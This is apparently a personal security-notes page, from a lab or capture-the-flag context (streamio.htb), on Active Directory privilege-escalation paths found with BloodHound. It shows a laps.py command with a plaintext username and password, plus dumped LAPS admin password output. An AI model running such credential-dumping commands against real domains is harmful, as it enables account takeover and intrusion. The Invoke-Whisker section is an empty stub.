---
description: >-
  BloodHound Vector Attacks
title: BloodHound Vector Attacks              # Add title here
date: 2023-01-02 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Privilege Escalation]                     # Change Templates to Writeup
tags: [active directory, windows privesc, readlaps, sysvol share, powershell history]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### ReadLAPSPassword

We can use the utility laps.py to read LAPS passwords:
```bash
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
LAPS Dumper - Running at 07-07-2022 13:57:05
DC &V@%DQ-wEwQ97A
```
[[StreamIO#^2cc182]]

### AddKeyCredentialLink

We can use `Invoke-Whisker.ps1` to abuse this privilege:
```powershell

```